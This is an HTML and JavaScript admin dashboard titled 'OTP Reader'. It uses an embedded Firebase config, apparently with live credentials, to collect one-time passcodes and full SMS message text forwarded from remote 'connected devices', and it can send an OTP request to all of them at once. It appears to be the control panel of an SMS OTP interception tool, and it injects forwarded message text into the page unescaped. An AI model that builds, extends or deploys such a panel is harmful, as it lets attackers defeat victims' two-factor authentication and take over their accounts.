<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>📱 OTP Reader - Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
        body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;font-family:'Courier New',monospace}
        .container{max-width:1200px;margin:0 auto}
        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px;flex-wrap:wrap;gap:10px}
        .header h1{font-size:22px;color:#00ff41}
        .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188;flex-wrap:wrap}
        .header .status .dot{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
        .btn{padding:8px 16px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133;font-family:'Courier New',monospace}
        .btn:hover{background:#00ff4133}
        .btn-success{background:#00ff4122;border-color:#00ff41}
        .btn-danger{background:#ff444422;border-color:#ff4444;color:#ff4444}
        .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
        .card h3 span{color:#00ff4188;font-size:11px;font-weight:400}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
        .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
        .stat-card .num{font-size:24px;font-weight:800;color:#00ff41}
        .stat-card .label{font-size:11px;color:#00ff4188}
        .otp-display{background:#001a00;padding:30px;border-radius:12px;border:2px solid #00ff41;text-align:center;margin:12px 0}
        .otp-display .otp{font-size:48px;font-weight:800;color:#00ff41;letter-spacing:6px;font-family:'Courier New',monospace}
        .otp-display .label{font-size:12px;color:#00ff4188;margin-top:4px}
        .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
        .item .label{color:#00ff4188}
        .item .value{color:#00ff41}
        .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
        .logs .log-entry{color:#00ff41;padding:2px 0}
        .firebase-badge{font-size:10px;color:#00ff4188;border:1px solid #00ff4122;padding:4px 12px;border-radius:20px;display:inline-block}
        .online{color:#00ff41}
        .offline{color:#ff4444}
        .device-list{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px}
        .device-card{background:#0d0d0d;border-radius:12px;padding:14px;border:1px solid #00ff4122}
        .device-card .device-id{font-size:13px;color:#00ff41;font-weight:700}
        .device-card .otp{font-size:20px;color:#00ff41;font-weight:800;letter-spacing:2px;margin:6px 0}
        .device-card .time{font-size:10px;color:#00ff4188}
        @media(max-width:768px){.device-list{grid-template-columns:1fr}}
    </style>
</head>
<body>

<div class="container">

    <div class="header">
        <div>
            <h1>📱 OTP READER</h1>
            <div style="font-size:11px;color:#00ff4188;">
                <span class="firebase-badge">🔥 Live OTP Forwarding</span>
                <span id="firebaseStatus" class="offline" style="margin-left:8px;">● Connecting...</span>
            </div>
        </div>
        <div class="status">
            <span class="dot"></span>
            <span id="liveStatus">Live</span>
            <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
            <button class="btn" onclick="loadData()">🔄 Refresh</button>
            <button class="btn btn-success" onclick="requestOTP()">📩 Request OTP</button>
            <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear</button>
        </div>
    </div>

    <!-- Latest OTP -->
    <div class="card" style="border-color:#00ff4166;">
        <h3>🔑 Latest OTP</h3>
        <div class="otp-display">
            <div class="otp" id="latestOtp">-----</div>
            <div class="label" id="otpSource">Waiting for OTP...</div>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card"><div class="num" id="totalDevices">0</div><div class="label">📱 Devices</div></div>
        <div class="stat-card"><div class="num" id="totalOtps">0</div><div class="label">🔑 OTPs Received</div></div>
    </div>

    <h3 style="font-size:14px;color:#00ff41;margin-bottom:12px;">📱 Connected Devices</h3>
    <div class="device-list" id="deviceList">
        <div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>
    </div>

    <div class="logs" id="logs">
        <div class="log-entry">[System] OTP Reader ready</div>
    </div>

</div>

<!-- ===== FIREBASE SDK ===== -->
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>

<script>
// ==========================================
// 🔥 FIREBASE CONFIG
// ==========================================
const firebaseConfig = {
    apiKey: "AIzaSyCq5-Rrk6dh0SzqKcR8zR8zFHeGUgTj960",
    authDomain: "phone-acces-f7b2a.firebaseapp.com",
    projectId: "phone-acces-f7b2a",
    storageBucket: "phone-acces-f7b2a.firebasestorage.app",
    messagingSenderId: "561680712228",
    appId: "1:561680712228:web:77bf30d6cf328e19038eb1",
    measurementId: "G-3K3WD2EP7M"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let otpData = {};
let latestOtp = null;

// ==========================================
// FIREBASE STATUS
// ==========================================
function updateFirebaseStatus(connected) {
    const statusEl = document.getElementById('firebaseStatus');
    if (connected) {
        statusEl.className = 'online';
        statusEl.textContent = '🟢 Connected';
        addLog('🔥 Firebase connected');
    } else {
        statusEl.className = 'offline';
        statusEl.textContent = '🔴 Disconnected';
        addLog('❌ Firebase disconnected');
    }
}

database.ref('.info/connected').on('value', (snap) => {
    updateFirebaseStatus(snap.val());
});

// ==========================================
// LOAD DATA
// ==========================================
function loadData() {
    addLog('📊 Loading data...');
    
    database.ref('otps').once('value')
        .then(snapshot => {
            const data = snapshot.val();
            if (data) {
                otpData = data;
                renderDevices();
                updateStats();
                addLog('✅ Loaded: ' + Object.keys(otpData).length + ' devices');
                document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
            } else {
                otpData = {};
                document.getElementById('deviceList').innerHTML = '<div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>';
                addLog('⚠️ No data found');
            }
        })
        .catch(err => addLog('❌ Firebase error: ' + err.message));
}

// ==========================================
// REAL-TIME LISTENER
// ==========================================
function startRealtimeListener() {
    database.ref('otps').on('value', snapshot => {
        const data = snapshot.val();
        if (data) {
            otpData = data;
            renderDevices();
            updateStats();
            updateLatestOTP();
            document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
            addLog('🔄 Real-time update: ' + Object.keys(otpData).length + ' devices');
        }
    });
}

// ==========================================
// RENDER DEVICES
// ==========================================
function renderDevices() {
    const container = document.getElementById('deviceList');
    const deviceIds = Object.keys(otpData);

    if (deviceIds.length === 0) {
        container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected</div>';
        return;
    }

    container.innerHTML = deviceIds.map(id => {
        const d = otpData[id];
        const otp = d.otp || '-----';
        const time = d.timestamp ? new Date(d.timestamp).toLocaleTimeString() : 'Never';
        const from = d.from || 'Unknown';
        
        return `
            <div class="device-card">
                <div class="device-id">📱 ${id}</div>
                <div class="otp">🔑 ${otp}</div>
                <div class="time">📩 ${from} • ${time}</div>
                <div style="font-size:9px;color:#00ff4188;margin-top:4px;word-break:break-all;">${d.message || ''}</div>
            </div>
        `;
    }).join('');
}

// ==========================================
// UPDATE LATEST OTP
// ==========================================
function updateLatestOTP() {
    const deviceIds = Object.keys(otpData);
    let latest = null;
    let latestTime = 0;

    deviceIds.forEach(id => {
        const d = otpData[id];
        if (d.timestamp) {
            const time = new Date(d.timestamp).getTime();
            if (time > latestTime) {
                latestTime = time;
                latest = d;
            }
        }
    });

    if (latest && latest.otp) {
        latestOtp = latest.otp;
        document.getElementById('latestOtp').textContent = latest.otp;
        document.getElementById('otpSource').textContent = '📩 From: ' + (latest.from || 'Unknown') + ' | ' + new Date(latestTime).toLocaleTimeString();
    }
}

// ==========================================
// UPDATE STATS
// ==========================================
function updateStats() {
    const deviceIds = Object.keys(otpData);
    let totalOtps = 0;
    deviceIds.forEach(id => {
        if (otpData[id].otp) totalOtps++;
    });
    document.getElementById('totalDevices').textContent = deviceIds.length;
    document.getElementById('totalOtps').textContent = totalOtps;
}

// ==========================================
// REQUEST OTP
// ==========================================
function requestOTP() {
    addLog('📩 Requesting OTP from devices...');
    
    // Send request to all devices
    const deviceIds = Object.keys(otpData);
    if (deviceIds.length === 0) {
        addLog('⚠️ No devices connected');
        toast('⚠️ No devices connected');
        return;
    }

    deviceIds.forEach(id => {
        database.ref('requests/' + id).set({
            request: 'otp',
            timestamp: new Date().toISOString()
        }).then(() => {
            addLog('📩 OTP requested from: ' + id);
        }).catch(err => {
            addLog('❌ Request error: ' + err.message);
        });
    });

    toast('📩 OTP requested from all devices');
}

// ==========================================
// CLEAR ALL
// ==========================================
function clearAll() {
    if (!confirm('Delete all OTP data?')) return;
    database.ref('otps').remove()
        .then(() => {
            otpData = {};
            renderDevices();
            updateStats();
            document.getElementById('latestOtp').textContent = '-----';
            document.getElementById('otpSource').textContent = 'Waiting for OTP...';
            addLog('🗑️ All data cleared');
            toast('🗑️ Data cleared!');
        })
        .catch(err => addLog('❌ Clear error: ' + err.message));
}

// ==========================================
// LOGS
// ==========================================
function addLog(msg) {
    const logs = document.getElementById('logs');
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.textContent = `[${time}] ${msg}`;
    logs.appendChild(entry);
    logs.scrollTop = logs.scrollHeight;
    if (logs.children.length > 20) logs.removeChild(logs.children[0]);
}

// ==========================================
// TOAST
// ==========================================
function toast(msg) {
    const t = document.createElement('div');
    t.style.cssText = `
        position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
        background: #001a00; color: #00ff41; padding: 10px 20px; border-radius: 8px;
        font-size: 12px; z-index: 9999; border: 1px solid #00ff4133;
        font-family: 'Courier New', monospace;
    `;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity 0.3s'; setTimeout(() => t.remove(), 300); }, 2000);
}

// ==========================================
// EXPOSE FUNCTIONS
// ==========================================
window.loadData = loadData;
window.requestOTP = requestOTP;
window.clearAll = clearAll;

// ==========================================
// INIT
// ==========================================
loadData();
startRealtimeListener();
addLog('🟢 OTP Reader ready');
console.log('📱 OTP Reader Loaded');
console.log('🔥 Firebase:', firebaseConfig.databaseURL);
</script>
</body>
</html>
